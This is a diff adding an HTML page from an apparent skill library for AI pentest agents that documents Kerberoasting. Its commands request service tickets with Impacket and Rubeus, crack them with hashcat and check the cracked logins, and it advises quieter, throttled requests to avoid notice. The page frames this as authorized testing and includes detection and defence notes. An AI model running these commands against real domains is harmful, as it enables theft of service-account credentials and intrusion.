@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: kerberoast-execution</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../index.html#agents">Agents</a>
+<a href="../index.html#brains">Brains</a>
+<a href="../index.html#playbooks">Playbooks</a>
+<a href="../index.html#decisions">Decisions</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>kerberoast-execution</h2><div class="meta"><span class="badge gray">ad</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">100/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when you have any valid domain credential on an authorized</p><div class="deps"><span class="kind">sub-skill of:</span> <a href="kerberoasting.html">kerberoasting</a></div><div class="deps"><span class="kind">requires:</span> <a href="kerberoasting.html">kerberoasting</a></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="ad-enumeration.html">ad-enumeration</a> <a href="password-attacks.html">password-attacks</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>Impacket</td><td>0.11.0</td></tr><tr><td>Hashcat</td><td>6.2.6</td></tr><tr><td>PowerShell</td><td>7.4</td></tr></tbody></table><p>Kerberoasting requests a service ticket for every SPN account and cracks the ticket&#x27;s encrypted part offline: the service account&#x27;s password hash, without ever touching the account. Any domain user can do it, which makes it one of the highest-yield AD techniques. This skill covers executing it on authorized engagements: requesting tickets, formatting them for the cracker, and keeping the request pattern sane.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Confirm you hold any valid domain credential (any user works).</li>
+<li>Enumerate SPN accounts and note their service types.</li>
+<li>Request service tickets for the SPN set.</li>
+<li>Export tickets in Hashcat format ($krb5tgs$).</li>
+<li>Crack with the password-attacks workflow, starting targeted.</li>
+<li>Verify cracked credentials by binding, and handle them securely.</li>
+<li>Report each cracked service account with its privilege level.</li>
+</ol>
+<h2>1. Requesting tickets</h2>
+<pre><code class="language-bash"># Impacket: request all SPN tickets, output in Hashcat format
+python3 /opt/impacket/examples/GetUserSPNs.py corp.example/testuser:&#x27;TestPass123!&#x27; \
+  -dc-ip 10.0.5.10 -request -outputfile /tmp/kerberoast.txt
+head -3 /tmp/kerberoast.txt
+
+# Target one high-value SPN only (quieter, for sensitive phases)
+python3 /opt/impacket/examples/GetUserSPNs.py corp.example/testuser:&#x27;TestPass123!&#x27; \
+  -dc-ip 10.0.5.10 -request-user sqlservice -outputfile /tmp/one.txt</code></pre>
+<pre><code class="language-powershell"># Rubeus on a domain-joined Windows host
+Rubeus.exe kerberoast /outfile:C:\temp\hashes.txt
+# Targeted: Rubeus.exe kerberoast /user:sqlservice /outfile:C:\temp\one.txt</code></pre>
+<p>Requesting all SPNs at once is the standard pattern and is what defenders expect to see. Targeted requests are quieter but slower; use them when the engagement calls for low visibility.</p>
+<h2>2. Cracking the tickets</h2>
+<pre><code class="language-bash"># Hashcat mode 13100 = Kerberos 5 TGS-REP
+hashcat -m 13100 /tmp/kerberoast.txt /tmp/targeted_wordlist.txt \
+  -r /usr/share/hashcat/rules/best64.rule -o /tmp/krb_cracked.txt
+
+# Check the service account names first: human-named service accounts
+# (sqlservice, backupsvc) crack far more often than random ones
+cut -d&#x27;$&#x27; -f4 /tmp/kerberoast.txt | sort -u | head -20
+
+# Verify a cracked credential immediately (it may already be rotated)
+python3 /opt/impacket/examples/ldapsearch.py \
+  corp.example/sqlservice:&#x27;CrackedPass123!&#x27; -dc-ip 10.0.5.10 \
+  -request &quot;(sAMAccountName=sqlservice)&quot; -attributes memberOf 2&gt;&amp;1 | head -10</code></pre>
+<p>Prioritize by privilege: crack the SPN list, then check each cracked account&#x27;s group membership. A cracked Domain Admin service account ends the engagement; a cracked low-privilege SQL account is lateral movement.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>AES-only service accounts resist classic kerberoasting. The ticket</li>
+<p>uses the account&#x27;s strongest etype; AES tickets need much more work, so note the account and move on unless time allows.</p>
+<li>No SPNs exist. Small or hardened domains may have none; check for</li>
+<p>AS-REP roastable accounts instead (see asrep-roast-execution).</p>
+<li>The crack yields nothing. Service accounts with 30-character random</li>
+<p>passwords are the correct configuration; report the negative result as positive assurance for those accounts.</p>
+<li>Ticket requests get blocked. Some defenses throttle TGS requests;</li>
+<p>slow down and target high-value SPNs only.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>A cracked account has high privilege: follow the engagement&#x27;s</li>
+<p>credential handling, use the access for the objectives, and report the weak password as the root cause.</p>
+<li>You need the ticket for pass-the-ticket instead of the password: keep</li>
+<p>the raw ticket (see ticket-analysis) alongside the crack attempt.</p>
+<li>Mass kerberoasting is too noisy for this phase: switch to targeted</li>
+<p>requests against the accounts that matter.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see kerberoasting as a burst of TGS-REQ packets for many SPNs from one user, especially users who never request tickets normally, plus RC4 etype requests. Good detection is KDC analytics on ticket request patterns. Defenses are long random passwords (30+ characters) on all service accounts, AES-only where possible, managed service accounts (gMSA) that rotate passwords automatically, and alerting on anomalous TGS patterns.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1558.003 (Steal or Forge Kerberos Tickets:</li>
+<p>Kerberoasting).</p>
+<li>CWE-521 (Weak Password Requirements).</li>
+<li>CWE-327 (Use of a Broken or Risky Cryptographic Algorithm, RC4).</li>
+<li>Impacket GetUserSPNs documentation.</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
